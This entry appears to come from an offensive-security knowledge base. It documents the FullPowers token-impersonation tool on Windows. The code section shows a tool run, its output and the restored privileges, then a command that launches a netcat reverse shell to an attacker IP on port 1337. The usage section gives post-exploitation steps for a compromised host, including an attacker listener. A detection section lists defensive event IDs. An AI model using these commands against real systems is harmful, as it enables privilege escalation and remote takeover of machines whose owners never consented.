---
id: 8bf75184-50d4-4144-911d-f9b9e4b2261d
name: fullpowers-impersonation-demonstration
type: code
language: cmd
verified: true
created_at: '2023-04-06T03:56:30.092100+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - impersonation
  - demonstration
validated: true
---

# fullpowers-impersonation-demonstration

## Code

```cmd
# https://github.com/itm4n/FullPowers

c:\TOOLS>FullPowers
[+] Started dummy thread with id 9976
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19041.84]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
```

## Description

This code snippet demonstrates the usage of FullPowers for token impersonation on Windows, showing basic launch, privilege verification, and execution of a reverse shell command. It illustrates the tool's output and elevated shell behavior for educational and reference purposes in privilege escalation scenarios.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 1.2.3.4 | Attacker IP for reverse shell connection | 192.168.1.100 |
| 1337 | Listening port on attacker machine | 4444 |
| C:\TOOLS\nc64.exe | Path to netcat executable | C:\TOOLS\nc.exe |
| cmd | Shell to bind in reverse shell | powershell |

## Usage

Run this in a compromised Windows environment with SeImpersonatePrivilege. First, launch basic FullPowers to get an elevated shell, verify privileges with whoami, then execute the payload command for remote access. Requires a netcat listener on the attacker side (e.g., nc -lvnp 1337). Used in post-exploitation for escalating to SYSTEM via service account impersonation.

## Detection

- Monitor for scheduled task creations (Event ID 4698) with suspicious names or triggers.
- Log token privilege changes (Event ID 4672/4673) and process creations from svchost.exe or similar.
- Network connections from unusual processes to external IPs on high ports.
- PowerShell or cmd.exe spawning with elevated tokens; use Sysmon rules for SeImpersonatePrivilege abuse.

## Related

- [[procedures/Windows-Restore-Service-Account-Privileges-via-Impersonation]]
- [[tools/FullPowers]]
